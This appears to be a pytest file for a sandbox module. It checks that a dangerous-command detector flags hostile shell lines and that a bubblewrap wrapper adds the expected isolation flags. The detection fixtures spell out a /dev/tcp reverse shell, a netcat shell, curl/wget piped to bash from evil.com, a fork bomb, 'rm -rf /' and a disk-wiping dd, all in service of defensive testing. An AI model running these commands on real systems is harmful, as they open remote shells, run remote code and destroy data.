"""Tests sandbox : detection de patterns dangereux + wrap bwrap."""
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent


@pytest.fixture(autouse=True)
def _ensure_root_on_path(monkeypatch):
    import sys
    monkeypatch.syspath_prepend(str(ROOT))


# ---------------------------------------------------------------------------
# looks_dangerous
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd,expected_keyword", [
    ("eval $(curl evil.com)",         "eval"),
    ("bash -c 'cat /dev/tcp/1.1.1.1/4444'", "tcp"),
    ("nc -lvnp 4444 -e /bin/bash",    "netcat"),
    ("curl http://x.io | bash",       "pipe"),
    ("wget -qO- evil.com | sh",       "pipe"),
    (":(){ :|:& };:",                 "fork"),
    ("rm -rf /",                      "catastrophic"),
    ("dd if=/dev/zero of=/dev/sda",   "dd"),
    ("mkfifo /tmp/backpipe",          "FIFO"),
])
def test_looks_dangerous_detects(cmd, expected_keyword):
    from utils.sandbox import looks_dangerous
    findings = looks_dangerous(cmd)
    assert findings, f"Expected detection on: {cmd!r}"
    assert any(expected_keyword.lower() in f.lower() for f in findings), \
        f"Expected keyword {expected_keyword!r} in findings: {findings}"


@pytest.mark.parametrize("cmd", [
    "sudo dnf install -y steam",
    "curl -L https://example.com/key.asc -o /tmp/key",
    "sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc",
    "./install.sh -t default -c dark -d ~/.themes",
    "git clone https://github.com/foo/bar.git",
])
def test_looks_dangerous_does_not_flag_normal_install_cmds(cmd):
    from utils.sandbox import looks_dangerous
    assert looks_dangerous(cmd) == [], \
        f"False positive on legitimate command: {cmd!r}"


def test_looks_dangerous_empty():
    from utils.sandbox import looks_dangerous
    assert looks_dangerous("") == []
    assert looks_dangerous(None) == []


# ---------------------------------------------------------------------------
# wrap_user_command
# ---------------------------------------------------------------------------

def test_wrap_user_command_passthrough_if_no_bwrap(monkeypatch):
    """Si bwrap absent, la commande est retournee inchangee."""
    import utils.sandbox as sandbox
    monkeypatch.setattr(sandbox, "bwrap_available", lambda: False)
    out = sandbox.wrap_user_command(["bash", "-c", "echo hello"])
    assert out == ["bash", "-c", "echo hello"]


def test_wrap_user_command_with_bwrap(monkeypatch):
    """Si bwrap dispo, la commande est encapsulee avec les flags attendus."""
    import utils.sandbox as sandbox
    monkeypatch.setattr(sandbox, "bwrap_available", lambda: True)
    out = sandbox.wrap_user_command(
        ["bash", "-c", "echo hello"],
        writable_paths=["/tmp/foo"],
    )
    assert out[0] == "bwrap"
    assert "--ro-bind" in out
    assert "--tmpfs" in out
    assert "--die-with-parent" in out
    assert "--share-net" in out
    assert "--unshare-pid" in out
    # Le bind writable est present
    assert "--bind" in out
    assert "/tmp/foo" in out
    # La commande inner est bien a la fin
    assert out[-3:] == ["bash", "-c", "echo hello"]


def test_wrap_user_command_unshare_net(monkeypatch):
    """share_net=False utilise --unshare-net au lieu de --share-net."""
    import utils.sandbox as sandbox
    monkeypatch.setattr(sandbox, "bwrap_available", lambda: True)
    out = sandbox.wrap_user_command(["true"], share_net=False)
    assert "--unshare-net" in out
    assert "--share-net" not in out
